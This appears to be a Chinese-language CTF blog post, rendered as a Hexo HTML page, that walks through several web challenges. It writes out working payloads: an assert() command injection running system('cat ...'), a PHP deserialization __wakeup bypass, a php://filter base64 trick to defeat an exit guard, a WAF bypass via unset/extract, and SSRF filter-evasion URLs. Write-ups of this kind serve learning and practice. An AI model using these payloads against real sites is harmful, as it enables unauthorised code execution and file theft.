@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mktubu.github.io","root":"/","scheme":"Gemini","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="部分CTF思路Lottery">
+<meta property="og:type" content="article">
+<meta property="og:title" content="部分CTF解题思路">
+<meta property="og:url" content="https://mktubu.github.io/2019/05/11/CTF_2/index.html">
+<meta property="og:site_name" content="重明">
+<meta property="og:description" content="部分CTF思路Lottery">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/1.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/2.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/3.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/4.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/5.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/6.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/7.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/8.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/9.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/10.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/11.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/12.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/13.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/14.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/15.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/16.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/17.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/18.jpg">
+<meta property="og:image" content="https://mktubu.github.io/images/ctf_2/19.jpg">
+<meta property="article:published_time" content="2019-05-11T11:51:24.000Z">
+<meta property="article:modified_time" content="2020-02-24T02:48:37.047Z">
+<meta property="article:author" content="ChongMing">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mktubu.github.io/images/ctf_2/1.jpg">
+
+<link rel="canonical" href="https://mktubu.github.io/2019/05/11/CTF_2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>部分CTF解题思路 | 重明</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="重明" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">重明</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mktubu.github.io/2019/05/11/CTF_2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="ChongMing">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="重明">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          部分CTF解题思路
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-05-11 19:51:24" itemprop="dateCreated datePublished" datetime="2019-05-11T19:51:24+08:00">2019-05-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-02-24 10:48:37" itemprop="dateModified" datetime="2020-02-24T10:48:37+08:00">2020-02-24</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.2k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="部分CTF思路"><a href="#部分CTF思路" class="headerlink" title="部分CTF思路"></a>部分CTF思路</h1><h4 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery"></a>Lottery</h4><p><img src="/images/ctf_2/1.jpg" alt="1"></p>
+<a id="more"></a>
+<p>这道题的思路比较简单，买彩票赚钱，有钱就可以购买flag</p>
+<p>先访问robots.txt</p>
+<p><img src="/images/ctf_2/2.jpg" alt="2"></p>
+<p>有可能存在.git泄露，使用工具跑一下</p>
+<p><img src="/images/ctf_2/3.jpg" alt="3"></p>
+<p>利用工具下载源码，进行代码审计</p>
+<p><img src="/images/ctf_2/4.jpg" alt="4"></p>
+<p>代码中对number传入的参数没有判断，且使用<strong>==</strong>存在弱类型比较</p>
+<blockquote>
+<p>在PHP中遇到数字与字符串进行松散比较()时，会将字符串中前几位是数字且数字后面不是”.”，“e”或”E”的子串转化为数字，与数字进行比较，如果相同则返回为true，不同返回为false，后面的所有字符串直接截断扔掉。</p>
+</blockquote>
+<p>所以我们利用true让if的判断表达式返回值一直为真，最后修改发送请求的内容</p>
+<p>构造<code>{&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]}</code></p>
+<p>利用burp发送数据</p>
+<p><img src="/images/ctf_2/5.jpg" alt="5"></p>
+<p>有足够的钱后购买flag</p>
+<h4 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h4><p>首先打开网站，观察url<code>http://111.198.29.45:30457/?page=about</code>感觉像文件包含，但是发现使用../遍历目录时被过滤</p>
+<ul>
+<li>先扫一下目录</li>
+</ul>
+<p><img src="/images/ctf_2/6.jpg" alt="6"></p>
+<p>发现存在.git目录，使用工具跑一下，得到源码</p>
+<p><img src="/images/ctf_2/7.jpg" alt="7"></p>
+<p>发现flag位于templates文件夹下，但是无法查看，可以查看到index.php</p>
+<p><img src="/images/ctf_2/8.jpg" alt="8"></p>
+<p>file经过过滤..()防止目录遍</p>
+<p>发现该代码使用<code>assert</code>函数且<code>$file</code>变量是未经检查的用户输入创建的，即<code>$_GET[&#39;page&#39;]</code>,我们可以使用<code>$file</code>命令注入<code>assert</code>语句。</p>
+<p><strong>assert()简介</strong>：</p>
+<blockquote>
+<p>判断一个表达式是否成立，返回true or false</p>
+<p>当参数为字符串时，会被当作php代码执行</p>
+<p>例如： assert(“phpinfo()”)  &lt;==&gt;  <?phpinfo()?></p>
+</blockquote>
+<p>所以我们可以通过可控变量<strong>file</strong>传入而已参数，构造闭合file_exists(),使assert()执行恶意代码</p>
+<p><code>111.198.29.45:30457/?page=home%27).%20system(&quot;cat%20templates/flag.php&quot;);%20//</code></p>
+<p><img src="/images/ctf_2/9.jpg" alt="9"></p>
+<p><code>111.198.29.45:30457/?page=home%27).%20system(&quot;ls%20-lah%20templates&quot;);%20//</code></p>
+<p><img src="/images/ctf_2/10.jpg" alt="10"></p>
+<p><code>111.198.29.45:30457/?page=home%27).%20system(&quot;cat%20templates/flag.php&quot;);%20//</code></p>
+<p><img src="/images/ctf_2/11.jpg" alt="11"></p>
+<h4 id="unserilalize3"><a href="#unserilalize3" class="headerlink" title="unserilalize3"></a>unserilalize3</h4><p>该题目在页面直接给出了代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> function <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">exit(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
+
+<p>在代码中定义了类<code>xctf</code>，并且有一个<code>flag</code>属性赋值为<code>111</code>,还有魔术变量<code>wake_up()</code></p>
+<p><strong><code>wake_up()魔术方法：</code></strong><br><strong>unserialize()</strong> 会检查是否存在一个<strong>wake_up()</strong>方法。如果存在，则会先调用<strong>wake_up()</strong>方法，预先准备对象需要的资源。 </p>
+<p><strong><code>wake_up()执行漏洞：</code></strong><br>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>wake_up()</code>的执行。即一个字符串或对象被序列化后，如果其属性被修改，则不会执行wake_up()函数.所以通过改变序列化后的属性的个数来构造<strong>payload</strong></p>
+<p><img src="/images/ctf_2/12.jpg" alt="12"></p>
+<p><strong>payload：</strong><code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code><img src="/images/ctf_2/13.jpg" alt="13"></p>
+<h4 id="529"><a href="#529" class="headerlink" title="529"></a>529</h4><p>打开网页发现是一个购买类的网站，先注册，登陆后发现提示，只有购买5个商品后才能得到提示</p>
+<p><img src="/images/ctf_2/14.jpg" alt="14"></p>
+<p>每次新注册的用户只有1000积分，推荐一个人给100分，利用推荐的可拥有的最大积分为1300</p>
+<ul>
+<li><strong>利用条件竞争进行购买</strong></li>
+</ul>
+<p>在购买商品时发现，购买商品有明显的延时，可能是因为判断金额是否满足，所以可以利用条件竞争使多个进程同时通过金额判断，阻塞后在同一时间内付款，就可以导致非法购买商品，我们利用已有的1300积分，先购买3个商品，在购买第四个时，在俩个浏览器内同时进行购买。由于相同浏览器会对session进行限制，保证其在同一个进程请求）</p>
+<p>再购买第五件商品后得到提示</p>
+<p><img src="/images/ctf_2/15.jpg" alt="15"></p>
+<ul>
+<li><strong>SSRF读取任意文件</strong></li>
+</ul>
+<p>访问该链接，得到一个<strong>url</strong>请求页面，但是访问<strong>flag.php</strong>没有反应。</p>
+<p>尝试使用<strong>file</strong>协议对<strong>flag.php</strong>进行读取得到<strong>Flag</strong></p>
+<p><img src="/images/ctf_2/16.jpg" alt="16"></p>
+<ul>
+<li><strong>unset</strong></li>
+</ul>
+<p>题目一开始就给出源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'index.php'</span>); <span class="comment">//对文件进行语法高亮显示</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $value)&#123;  <span class="comment">//foreach 用于遍历数组</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>,$key))&#123;     <span class="comment">//表示传入的键名中不能含有flag字符</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'are you a hacker'</span>); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_POST'</span>, <span class="string">'_GET'</span>, <span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $__R) &#123;  </span><br><span class="line">    <span class="comment">//将POST,GET,COOKIR三个变量依次赋值给$__R,若$__R中存在数据，则进行下一步</span></span><br><span class="line">        <span class="keyword">if</span>($$__R) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>($$__R <span class="keyword">as</span> $__k =&gt; $__v) &#123;            <span class="comment">//取出$POST所对应的值的值</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($$__k) &amp;&amp; $$__k == $__v) <span class="keyword">unset</span>($$__k);   <span class="comment">//销毁指定的变量</span></span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST) &#123; waf($_POST);&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET) &#123; waf($_GET); &#125;</span><br><span class="line"><span class="keyword">if</span>($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="comment">//extract的对象内的键名会成为一个新的变量，而这个新变量的值就是这个键名的值,后面的参数EXTR_SKIP避免了变量覆盖。extract函数会恢复我们unset的值，这样便可以实现对waf的完全绕过。</span></span><br><span class="line"><span class="comment">//extract()函数，此函数为变量注册函数，将数组中的数据以键名为变量名，键值为变量值的形式注册变量。</span></span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $_GET[<span class="string">'daiker'</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(md5($_GET[<span class="string">'flag'</span>] ) == md5($_GET[<span class="string">'daiker'</span>]))&#123;</span><br><span class="line">        <span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题要读取flag.php，如果不绕过<strong>waf</strong>是无法读取的，所以通过<strong>POST</strong>一个特殊的内容来达到绕过的目的。</p>
+<p>如果提前把<strong>_GET</strong>的内容给<strong>unset</strong>，就可以绕过<strong>waf</strong>，然后再通过<strong>extract</strong>函数给还原回来。</p>
+<p>构造<strong>payload：</strong></p>
+<p><img src="/images/ctf_2/17.jpg" alt="17"></p>
+<p><strong>POST</strong>传过去的内容为<strong>_GET</strong>,所以执行<strong>unset($$__k)</strong>，<strong>$$__k</strong>即为<strong>get</strong>参数的值，而而<strong>$__V</strong>是<strong>POST</strong>传入数组里的键值的值。举例说这里都可以是<strong>QNKCDZO</strong>。之后我们就把<strong>_GET</strong>里的数组给<strong>unset</strong>掉了。</p>
+<p>之后通过<code>if($_POST) extract($_POST, EXTR_SKIP);    if($_GET) extract($_GET, EXTR_SKIP);</code>将<strong>_GET</strong>给还原回来。达到绕过<strong>waf</strong>并读取<strong>flag.php</strong>的作用。*</p>
+<p><img src="/images/ctf_2/18.jpg" alt="18"></p>
+<p>参考文章：<a href="http://www.secevery.com:4321/bugs/wooyun-2014-063895" target="_blank" rel="noopener">全局变量覆盖导致的安全问题</a></p>
+<ul>
+<li>死亡退出</li>
+</ul>
+<p>打开题目给出源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  $c=<span class="string">"&lt;?php exit;?&gt;"</span>;</span><br><span class="line">  @$c.=$_POST[<span class="string">'c'</span>];<span class="comment">//.=相当于+=,POST的数据$c接在<span class="meta">&lt;?php</span> exit;<span class="meta">?&gt;</span>后面。</span></span><br><span class="line">  @$filename=$_POST[<span class="string">'file'</span>]; </span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>($filename))                    </span><br><span class="line">  &#123;                                       </span><br><span class="line">    file_put_contents(<span class="string">'tmp.php'</span>, <span class="string">''</span>); 将$c的内容存放到tmp.php这个文件中。</span><br><span class="line">  &#125;                                 </span><br><span class="line">  @file_put_contents($filename, $c);</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">'tmp.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>阅读代码<strong>$c</strong>在开头增加了<strong>exit</strong>所以导致用户无法直接执行，即使可以将文件写入也无法执行。</p>
+<p>但是<strong>$c=$_POST[‘file’]</strong>是可控协议，可以使用<strong>php://filter</strong>，使用<strong>php://filter</strong>流的<strong>base64-decode</strong></p>
+<p>方法将<strong>$c</strong>编码，利用<strong>php</strong>的<strong>base_decode</strong>函数特性去除<strong>exit</strong>。</p>
+<p>使用<strong>base64</strong>的解码方法时，<strong>base64</strong>的解码方法时以4个字节为一组，且会过滤一系列的特殊字符，<code>&lt;?php exit; ?&gt;</code>会被修正为<strong>phpexit</strong>这七个字符，我们只需要在写入变量<strong>c</strong>时在开头随便补充一位，在进行<strong>base64</strong>加密和解密时<strong>phpexit</strong>便会失效。</p>
+<p>参考文章：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>
+<p>对<code>&lt;?php echo file_get_contents(&quot;flag.php&quot;):?&gt;</code>进行<strong>base64</strong>编码得到<code>PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmxhZy5waHAiKTs/Pg==</code></p>
+<p><strong>payload:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/write=convert.base64-decode/resource=tmp.php&amp;c=aPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmxhZy5waHAiKTs/Pg==</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><strong>网站检测器</strong></li>
+</ul>
+<p>拿到题目后发现是一个检测网站功能的网页，按照提示输入网站后会将网页的内容输出到屏幕上</p>
+<p><img src="/images/ctf_2/19.jpg" alt="19"></p>
+<p>这里可以想到使用<strong>SSRF</strong>,一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。而这里我们可以通过<code>http://www.moctf.com/</code>访问到本地。</p>
+<ul>
+<li>利用<strong>URL</strong>解析问题：</li>
+</ul>
+<p>有时候后台会对访问的<strong>URL</strong>进行解析，然后对解析出的<strong>host</strong>地址进行过滤。这时候可通过对<strong>URL</strong>的解析不当绕过过滤。<code>http://www.moctf.com@127.0.0.1/flag.php</code>由于第一个地址后参数为@导致解析不当，当进行host地址过滤时，将会过滤掉第一个Host地址，保留第二个地址127.0.0.1让我们能够成功访问到它。</p>
+<ul>
+<li>对<strong>URL</strong>进行编码</li>
+</ul>
+<p>可以使用进制编码，例如</p>
+<p><strong>127.0.0.1</strong></p>
+<blockquote>
+<p>二进制：01111111.00000000.00000000.00000001</p>
+<p>八进制：017700000001</p>
+<p>十六进制：7f000001</p>
+</blockquote>
+<p>还可以使用<strong>URL</strong>编码，如<strong>flag.php</strong>进行二次编码后得到</p>
+<p><code>%25%36%36%25%36%43%25%36%31%25%36%37%25%32%45%25%37%30%25%36%38%25%37%30</code></p>
+<p>所以<strong>payload</strong>为：<code>http%3A%2F%2Fwww.moctf.com@017700000001/%25%36%36%25%36%43%25%36%31%25%36%37%25%32%45%25%37%30%25%36%38%25%37%30</code></p>
+<ul>
+<li><strong>SSRF绕过方法</strong></li>
+</ul>
+<p>1.利用DNS解析<br>网络上存在一个神奇的服务<strong><a href="http://xip.io/" target="_blank" rel="noopener">http://xip.io/</a></strong>当我们访问这个网站的子域名的时候会重新定向到主域名，例如<strong>192.168.0.1.xip.io</strong>，就会自动重定向到<strong>192.168.0.1。</strong></p>
+<p>2.通过各种非<strong>http</strong>协议<br> <strong>GOPHER</strong>协议：通过<strong>GOPHER</strong>我们在一个<strong>URL</strong>参数中构造<strong>Post</strong>或者<strong>Get</strong>请求。<br> 例如我们可以使用GOPHER协议对与内网的<strong>Redis</strong>服务进行攻击.<br> <strong>File</strong>协议：<strong>File</strong>协议主要用于访问本地计算机中的文件<br> <strong>Request:file:///C:/Windows/win.ini</strong></p>
+<p>3.<strong>DNS Rebuilding</strong><br> (1)服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP<br> (2)对于获得的IP进行判断，发现为非黑名单IP，则通过验证<br> (3)服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。<br> (4)由于已经绕过验证，所以服务器端返回访问内网资源的结果。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/03/24/Commix/" rel="prev" title="Commix-Command Injection Exploiter">
+      <i class="fa fa-chevron-left"></i> Commix-Command Injection Exploiter
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/05/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="next" title="格式化字符串漏洞">
+      格式化字符串漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#部分CTF思路"><span class="nav-number">1.</span> <span class="nav-text">部分CTF思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Lottery"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">Lottery</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mfw"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">mfw</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unserilalize3"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">unserilalize3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#529"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">529</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ChongMing"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">ChongMing</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mktubu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mktubu" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:528999959@qq.com" title="E-Mail → mailto:528999959@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
